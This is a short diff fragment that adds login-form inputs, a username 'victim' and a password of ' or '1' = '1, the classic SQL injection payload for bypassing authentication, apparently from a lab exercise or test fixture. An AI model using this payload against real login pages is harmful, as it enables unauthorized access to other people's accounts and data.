@@ -1,0 +1,4 @@
+username field:
+victim
+password field:
+' or '1' = '1
